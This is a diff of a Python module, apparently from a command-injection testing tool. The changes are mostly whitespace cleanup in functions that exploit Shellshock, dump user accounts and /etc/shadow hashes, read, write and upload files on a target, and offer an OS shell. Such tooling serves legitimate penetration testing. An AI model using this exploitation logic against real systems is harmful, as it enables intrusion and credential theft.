@@ -117,7 +117,7 @@ def enumeration(url, cve, check_header, filename):
     cu_account = cmd_exec(url, cmd, cve, check_header, filename)
     if cu_account:
       if menu.options.is_root:
-        cmd = settings.ISROOT
+        cmd = settings.IS_ROOT
         shell = cmd_exec(url, cmd, cve, check_header, filename)
         if menu.options.verbose:
           print ""
@@ -224,10 +224,10 @@ def enumeration(url, cve, check_header, filename):
               else :
                 is_privileged = ""
                 is_privileged_nh = ""
-              print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
+              print "  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
               # Add infos to logs file.   
               output_file = open(filename, "a")
-              output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+              output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
               output_file.close()
             except ValueError:
               if count == 1 :
@@ -270,10 +270,10 @@ def enumeration(url, cve, check_header, filename):
           try:
             fields = line.split(":")
             if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
-              print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
+              print "  (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
               # Add infos to logs file.   
               output_file = open(filename, "a")
-              output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
+              output_file.write("      (" +str(count)+ ") " + fields[0] + " : " + fields[1])
               output_file.close()
           # Check for appropriate (/etc/shadow) format
           except IndexError:
@@ -297,11 +297,11 @@ def file_access(url, cve, check_header, filename):
 
   #-------------------------------------
   # Write to a file on the target host.
-   #-------------------------------------
+  #-------------------------------------
   if menu.options.file_write:
     file_to_write = menu.options.file_write
     if not os.path.exists(file_to_write):
-      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
+      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '" + file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
       sys.stdout.flush()
       sys.exit(0)
       
@@ -310,7 +310,7 @@ def file_access(url, cve, check_header, filename):
         content = [line.replace("\n", " ") for line in content_file]
       content = "".join(str(p) for p in content).replace("'", "\"")
     else:
-      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
+      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + file_to_write + "' is not a file." + Style.RESET_ALL)
       sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
@@ -325,7 +325,7 @@ def file_access(url, cve, check_header, filename):
       dest_to_write = menu.options.file_dest
       
     # Execute command
-    cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
+    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
     shell = cmd_exec(url, cmd, cve, check_header, filename)
     
     # Check if file exists!
@@ -335,10 +335,10 @@ def file_access(url, cve, check_header, filename):
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_ALL)
+      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was created successfully!" + Style.RESET_ALL)
       sys.stdout.flush()
     else:
-     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
+     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '" + dest_to_write + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
@@ -352,7 +352,7 @@ def file_access(url, cve, check_header, filename):
     try:
       urllib2.urlopen(file_to_upload)
     except urllib2.HTTPError, err:
-      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
+      sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err)+ ")" + Style.RESET_ALL + "\n")
       sys.stdout.flush()
       sys.exit(0)
       
@@ -376,10 +376,10 @@ def file_access(url, cve, check_header, filename):
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!" + Style.RESET_ALL)
+      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" + Style.RESET_ALL)
       sys.stdout.flush()
     else:
-     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
+     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '" + dest_to_upload + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
@@ -404,7 +404,7 @@ def file_access(url, cve, check_header, filename):
       output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
       output_file.close()
     else:
-     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
+     sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '" + file_to_read + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
@@ -424,7 +424,7 @@ def shellshock_handler(url, http_request_method, filename):
   injection_type = "results-based command injection"
   technique = "shellshock injection technique"
 
-  sys.stdout.write("(*) Testing the "+ technique + "... ")
+  sys.stdout.write("(*) Testing the " + technique + "... ")
   sys.stdout.flush()
 
   try: 
@@ -456,9 +456,9 @@ def shellshock_handler(url, http_request_method, filename):
           elif cve in response.info():
             percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
           else:
-            percent = str(float_percent )+"%"
+            percent = str(float_percent )+ "%"
 
-          sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
+          sys.stdout.write("\r(*) Testing the " + technique + "... " +  "[ " + percent + " ]")  
           sys.stdout.flush()
 
           # Print the findings to log file.
@@ -471,10 +471,10 @@ def shellshock_handler(url, http_request_method, filename):
 
         if cve in response.info():
           no_result = False
-          print Style.BRIGHT + "\n(!) The ("+ check_header + ") '" + Style.UNDERLINE + url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
-          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
+          print Style.BRIGHT + "\n(!) The (" + check_header + ") '" + Style.UNDERLINE + url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to " + injection_type + "." + Style.RESET_ALL
+          print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
+          print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+          print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
           
           # Enumeration options.
           if settings.ENUMERATION_DONE == True :
@@ -547,7 +547,7 @@ def shellshock_handler(url, http_request_method, filename):
                         if no_result == True:
                           return False
                         else:
-                          return True
+                          return True 
                       elif os_shell_option == "quit":                    
                         sys.exit(0)
                       elif os_shell_option == "back":
